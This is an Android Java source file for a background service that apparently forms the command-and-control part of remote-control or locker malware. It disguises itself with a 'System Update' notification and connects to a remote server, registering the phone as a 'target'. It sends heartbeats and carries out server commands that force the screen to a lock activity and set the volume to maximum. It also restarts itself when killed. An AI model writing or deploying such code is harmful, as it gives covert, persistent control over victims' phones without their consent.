package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private static final String CHANNEL_ID = "background_service_channel";
    private static final int NOTIFICATION_ID = 9999;
    
    private WebSocket webSocket;
    private OkHttpClient client;
    private String deviceId;
    private String serverUrl;
    private Handler heartbeatHandler;
    private Runnable heartbeatRunnable;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        client = new OkHttpClient.Builder()
            .pingInterval(30, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build();
            
        heartbeatHandler = new Handler(Looper.getMainLooper());
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getExtras() != null) {
            deviceId = intent.getStringExtra("deviceId");
            serverUrl = intent.getStringExtra("serverUrl");
            connectWebSocket();
            startHeartbeat();
        }
        return START_STICKY; // Akan restart jika di-kill
    }
    
    private void connectWebSocket() {
        String wsUrl = serverUrl.replace("http", "ws") + "?id=" + deviceId + "&type=target";
        Request request = new Request.Builder().url(wsUrl).build();
        
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                Log.d(TAG, "WebSocket Connected di Background Service");
            }
            
            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.d(TAG, "Received: " + text);
                try {
                    JSONObject json = new JSONObject(text);
                    String command = json.optString("command");
                    String extra = json.optString("extra");
                    
                    // Kirim command ke Flutter (jika Flutter hidup)
                    sendCommandToFlutter(command, extra);
                    
                    // Eksekusi command langsung di Native jika perlu
                    executeNativeCommand(command, extra);
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error parsing message", e);
                }
            }
            
            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                Log.d(TAG, "WebSocket closing, reconnect in 5s");
                reconnect();
            }
            
            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "WebSocket error", t);
                reconnect();
            }
        });
    }
    
    private void reconnect() {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            if (webSocket != null) {
                webSocket.cancel();
            }
            connectWebSocket();
        }, 5000);
    }
    
    private void startHeartbeat() {
        heartbeatRunnable = new Runnable() {
            @Override
            public void run() {
                sendHeartbeat();
                heartbeatHandler.postDelayed(this, 30000);
            }
        };
        heartbeatHandler.post(heartbeatRunnable);
    }
    
    private void sendHeartbeat() {
        new Thread(() -> {
            try {
                URL url = new URL(serverUrl + "/api/heartbeat/" + deviceId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                
                JSONObject body = new JSONObject();
                body.put("battery", getBatteryLevel());
                body.put("from_background", true);
                
                OutputStream os = conn.getOutputStream();
                os.write(body.toString().getBytes());
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Heartbeat sent, response: " + responseCode);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Heartbeat failed", e);
            }
        }).start();
    }
    
    private int getBatteryLevel() {
        // Implementasi sederhana, bisa dari BroadcastReceiver
        return 50;
    }
    
    private void sendCommandToFlutter(String command, String extra) {
        try {
            Intent intent = new Intent("com.nullx.pp.BACKGROUND_COMMAND");
            intent.putExtra("command", command);
            intent.putExtra("extra", extra);
            sendBroadcast(intent);
        } catch (Exception e) {
            Log.e(TAG, "Failed to send to Flutter", e);
        }
    }
    
    private void executeNativeCommand(String command, String extra) {
        switch (command) {
            case "hard_lock":
                // Lock screen via DevicePolicyManager
                lockScreen();
                break;
            case "set_vol_max":
                setMaxVolume();
                break;
        }
    }
    
    private void lockScreen() {
        // Implementasi lock screen via DevicePolicyManager
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }
    
    private void setMaxVolume() {
        // Implementasi set volume max
        android.media.AudioManager audioManager = 
            (android.media.AudioManager) getSystemService(Context.AUDIO_SERVICE);
        if (audioManager != null) {
            int max = audioManager.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
            audioManager.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, max, 0);
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Running in background");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (heartbeatHandler != null && heartbeatRunnable != null) {
            heartbeatHandler.removeCallbacks(heartbeatRunnable);
        }
        if (webSocket != null) {
            webSocket.cancel();
        }
        // Restart service jika di-destroy
        Intent restartIntent = new Intent(this, BackgroundService.class);
        startService(restartIntent);
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}